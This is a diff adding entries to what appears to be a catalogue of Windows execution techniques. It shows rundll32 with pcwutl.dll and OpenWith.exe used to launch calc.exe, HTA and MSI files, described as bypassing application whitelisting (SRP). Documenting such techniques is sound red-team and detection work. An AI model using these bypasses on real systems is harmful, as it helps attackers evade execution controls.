@@ -113,9 +113,18 @@ ScriptRunner.exe -appvscript C:\Windows\System32\calc.exe
 install-Package C:\test.msi
 https://github.com/homjxi0e/MSIScript/blob/master/Exec-Execute.msi
 ```
+( 10v8 ) DLL Execute CML Launch Application 
+```
+rundll32.exe C:\Windows\System32\pcwutl.dll,LaunchApplication calc.exe
+```
+( 10v9 ) HTA/MSI Execute Using OpenWith.exe
+```
+Whitelisting SRP Bypassing Using OpenWith.exe To Launch HTA/MSI Execution 
+&- OpenWith.exe /c C:\test.hta 
+&- OpenWith.exe /c C:\testing.msi
+```
 
-(Note) Product Via @bohops 
-
+(Note) Product Via @bohops
 ( 11 ) HTA Launch Execution ( url.dll ) 
 ```
 Rundll32.exe url.dll,OpenURL FileHTA Or Anything 
